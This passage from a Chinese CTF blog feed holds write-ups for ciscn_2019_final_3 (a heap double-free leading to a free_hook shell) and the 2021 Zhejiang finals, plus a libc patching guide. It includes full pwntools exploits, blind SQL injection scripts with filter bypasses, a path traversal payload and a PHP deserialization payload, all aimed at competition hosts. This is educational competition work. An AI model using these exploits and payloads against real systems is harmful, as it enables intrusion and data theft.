src="/2021/11/02/WUSTCTF2020%20level4%20writeup/4.png" alt="4"></p><p>flag: wctf2020{This_IS_A_7reE}</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;好久没刷re了，来刷点re啊。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn2019_final_3 writeup</title>
    <link href="http://example.com/2021/11/01/ciscn2019_final_3%20writeup/"/>
    <id>http://example.com/2021/11/01/ciscn2019_final_3%20writeup/</id>
    <published>2021-11-01T14:00:00.000Z</published>
    <updated>2021-11-11T13:03:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录：<a href="https://buuoj.cn/challenges#ciscn_2019_final_3">ciscn_final_3</a></p><span id="more"></span><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>今天解决了C++文件换版本的问题，也是一刻没耽误直接做了这道C++题目，不得不说太爽了啊，再也不用因为题目是C++写的就做不了了，话不多说来看文件。</p><h2 id="静态分析elf文件"><a href="#静态分析elf文件" class="headerlink" title="静态分析elf文件"></a>静态分析elf文件</h2><p>题目告知是ubuntu18版本的，给了libc.so.6文件，但是盲猜跟它自己的一样，那就先换好elf文件的版本。checksec观察保护全开。然后IDA打开一看，发现是经典的堆菜单题，提供了两种操作，add和delete。delete很明显free之后指针没有清零，存在UAF漏洞，并且add只允许下标开到0x18，也就是0~24总共能add 25次。然后大小限制在了fastbin大小的范围内，但是很贴心地，每次add之后给了malloc之后的地址。那么大概率通过这里泄露（ps:一开始并没有想到，还想着用IO泄露来着的），思路大概是先通过一次double free修改一个chunk的size为其它大小，然后free一次，再修改成非fastbin范围的堆块，并且防止堆块放入unsortedbin被check fail，最好不要构造堆相互重叠(这句话的意思差不多就是尽量让小堆块完全被大堆块包含，因为它会检测next chunk的)。然后出来了libc的地址之后准备好之前被free的堆块，add添加之后libc地址落入tcache中，再次add泄露这个地址，然后就很简单了，double free劫持free_hook为system函数，再free一个带有/bin/sh字符串的堆块即可getshell。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;something&#x27;</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> index==<span class="number">11</span>:<span class="keyword">return</span> </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    <span class="comment">#if index==11:gdb.attach(p)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./ciscn_final_3&#x27;</span>,<span class="number">28019</span>)</span><br><span class="line">heap_addr=add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#double free保存一个free的0x30堆块在0号堆块位置</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x31</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))<span class="comment">#构造非fastbin大小的堆块</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):<span class="comment">#填满tcache 使其落入unsorted bin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">libc_addr=add(<span class="number">10</span>,<span class="number">0x28</span>,<span class="string">b&#x27;\0&#x27;</span>)-<span class="number">0x3ebca0</span><span class="comment">#泄露libc地址</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#劫持freehook</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">15</span>)<span class="comment">#getshell</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录：&lt;a href=&quot;https://buuoj.cn/challenges#ciscn_2019_final_3&quot;&gt;ciscn_final_3&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>关于C++文件换libc版本的问题</title>
    <link href="http://example.com/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://example.com/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/</id>
    <published>2021-11-01T02:00:00.000Z</published>
    <updated>2021-11-11T13:03:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天解决了一件困扰了我很久的事情，那就是对于elf文件的patch。以前我在做pwn题的时候，遇到C++文件总是束手无策。</p><span id="more"></span><p>在换过对应的版本之后，libc总是报错。就如下面这张图片</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt="1"></p><p>在此问了肥猫师傅给我的解决办法，解决办法很早就给了我的，但是我到现在才搞明白，弄懂,下面是肥猫师傅的原话。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/2.png" alt="2"></p><p>在此之前我一直都是用patchelf封装的脚本加上glibc all in one配合完美换libc版本，对于C程序是没有任何问题的。但是C++出现了问题，那么我们就先看看C和C++编译链接之后出来的文件的依赖库的结构。</p><p>那么为了测试就先写出两个版本的hello world程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//C++</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;Hello world&quot;</span>&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别用gcc和g++命令编译得到1和2可执行文件。</p><p>查看动态链接的关系。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/3.png" alt="3"></p><p>可以看到C++程序多了三项依赖，查一下自己glibc all in one libs中找得到一下依赖项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc.so.6</span><br><span class="line">libm.so.6</span><br><span class="line">ld.so.6</span><br></pre></td></tr></table></figure><p>我们换库的原因是因为malloc的分配以及各个函数在libc中的偏移在不同版本中都有着很大的区别，偏移问题不大，只需要在本地打出之后连接远程靶机的时候替换一下自己的libc即可。但是在打堆题的时候，不同libc分配有本质区别，比如，2.27的tcache允许直接double free，但是2.23和2.29之后都不允许直接的double free。以及2.34 的libc 中很多hook已经被删除，并不能利用。总之，在打堆题的时候版本是一个很重要的东西，不同版本利用手段都会有本质区别的。</p><p>我们patchelf的时候一般是指定链接器，然后再指定runpath到我们自己下载的库文件。那我们把这两个项换上2.23的libc之后ldd看看他们的依赖关系。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/4.png" alt="2"></p><p>可以看到两个文件都已经换上了2.23版本的libc，但是C++编译出来的文件出现了报错，报错是在我们换上的libc.so.6中报出的，然后报错的提醒是因为这个libstdc++.so.6。那么就可以确定一点了，c++自己额外提供了库，而这个库是libstdc++.so.6，而这一项指定到了我们系统的/lib/x86_64-linux-gnu/libstdc++.so.6这个库文件中，而这个库文件是对应了我们安装的版本的，因此我们需要去找一找2.23版本的这个C++的库，并且patch之后指向那个库应该就可以解决。这里可以学肥猫师傅的做法，先用docker装一个16版本的ubuntu，因为16版本刚好对应了libc的版本2.23。</p><p>这里先去用docker拉一个ubuntu16.04的镜像然后用如下命令进入这个镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#docker run -it ubuntu:16.04 /bin/bash</span><br></pre></td></tr></table></figure><p>进入之后装上g++和vim，用vim写一个hello world 并且编译之后ldd查看文件依赖关系，找到libstdc++.so.6指向的具体路径然后用docker cp命令拷贝到自己目录下，然后建议丢进libs目录，此时为C++文件再加一个patchelf命令，我这里用了如下命令，自己看情况改改路径即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$patchelf --replace-needed libstdc++.so.6 &#x27;/home/xiaoji233/pwn-tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libstdc++.so.6.0.21&#x27;  filename</span><br></pre></td></tr></table></figure><p>那么，改完了之后我们ldd看看情况。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/5.png" alt="5"></p><p>可以看到libstdc++.so.6已经指向了我们所给的库，并且也没有上面两行的报错了，因此这样就完成了一个C++程序的版本更换。</p><p>最后我们运行看看。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/6.png" alt="6"></p><p>完美成功运行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>小总结一波：在更换C程序的时候需要用patchelf更改链接器的版本和runpath，C++程序换libc版本的时候需要额外指定一个libstdc++.so.6这个库才能正常运行。</p><p>总而言之，解决这个问题心情十分爽快，也希望本篇博客能帮到很多人。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天解决了一件困扰了我很久的事情，那就是对于elf文件的patch。以前我在做pwn题的时候，遇到C++文件总是束手无策。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>2021浙江省决赛</title>
    <link href="http://example.com/2021/10/31/zjctf2021%20%E5%86%B3%E8%B5%9B/"/>
    <id>http://example.com/2021/10/31/zjctf2021%20%E5%86%B3%E8%B5%9B/</id>
    <published>2021-10-31T14:00:00.000Z</published>
    <updated>2021-11-11T13:03:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次比赛最终rank21，幸而拿到省赛一等奖最后一名。pwn题签到拿下二血，re签到拿下还是好的，但是pwn少拿了一道有点可惜。最终还是靠学长ak web才拿下的省一，希望学长明年还能带我。下面放出本次比赛提交的wp，misc和cry因为没有留下图片(就是wps复制过来的，导出pdf之后交了，后面word删了图片也就没了)。</p><span id="more"></span><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="远古特性"><a href="#远古特性" class="headerlink" title="远古特性"></a>远古特性</h4><p>换行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint/hint.txt%0a../../../../../../flag</span><br></pre></td></tr></table></figure><h4 id="just-login"><a href="#just-login" class="headerlink" title="just login"></a>just login</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://8fd95e2e-9d91-45b1-8ba9-d41be0125b3f.zj-ctf.dasctf.com:80/login&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">data = &#123;&quot;username&quot;: &quot;123&#x27; oorr 1=1 -- &quot;, &quot;password&quot;: &quot;1&quot;&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line">for i in range(1, 500):</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        data[</span><br><span class="line">            &#x27;username&#x27;] = &quot;1&#x27; oorr substr((sselectelect grogroupup_coonncat(username) frfromom users),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27; -- &quot;.format(</span><br><span class="line">            i, chr(mid))</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &#x27;Failed&#x27; in res.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    if mid == 32 or mid == 127:</span><br><span class="line">        break</span><br><span class="line">    flag = flag + chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑跑脚本完事</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://8fd95e2e-9d91-45b1-8ba9-d41be0125b3f.zj-ctf.dasctf.com:80/login&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">data = &#123;&quot;username&quot;: &quot;123&#x27; oorr 1=1 -- &quot;, &quot;password&quot;: &quot;1&quot;&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line">for i in range(1, 500):</span><br><span class="line">    low = 1</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        data[</span><br><span class="line">            &#x27;username&#x27;] = &quot;1&#x27; oorr substr((sselectelect grgroupoup_coonncat(sql) frfromom sqlite_maasster),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27; -- &quot;.format(</span><br><span class="line">            i, chr(mid))</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &#x27;Failed&#x27; in res.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    # if mid == 32 or mid == 127:</span><br><span class="line">    #     break</span><br><span class="line">    flag = flag + chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(&#x27;\n&#x27; + bytes.fromhex(flag).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h4><p>pop链是<code>Test::getFlag()&lt;- Fun:__call() &lt;- A:__get() &lt;- B:__destruct()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="keyword">array</span>(<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;getFlag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> Fun();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> A();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="string">&#x27;aaa&#x27;</span>;<span class="comment">//传给__get的参数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  Test::getFlag()&lt;- Fun:__call() &lt;- A:__get() &lt;- B:__destruct()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>然后利用PHP Bug 72663来绕过__wakeup。虽然版本是大于7.0.10，但还是可以，不知道为什么。</p><p>把payload的对象数改一下，改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:3:&#123;s:1:&quot;p&quot;;s:3:&quot;aaa&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;s:4:&quot;Test&quot;;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>打入，结束。</p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h4><p>strcat 栈溢出，利用已经有的后门cat flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">def conn(x,file_name):</span><br><span class="line">    if x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-64.so&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        p=remote(&#x27;89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com&#x27;,54500)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-buu64.so&#x27;)</span><br><span class="line">    return ELF(file_name),libc,p</span><br><span class="line">elf,libc,p=conn(0,&#x27;./sai_easy_pwn&#x27;)</span><br><span class="line"></span><br><span class="line">shell=0x40098e</span><br><span class="line">username=b&#x27;a&#x27;*0x30</span><br><span class="line">pwd=b&#x27;a&#x27;*24+p64(shell)</span><br><span class="line"></span><br><span class="line">p.sendafter(b&#x27;username:&#x27;,username)</span><br><span class="line">p.sendafter(b&#x27;password&#x27;,pwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="最简单的逆向"><a href="#最简单的逆向" class="headerlink" title="最简单的逆向"></a>最简单的逆向</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 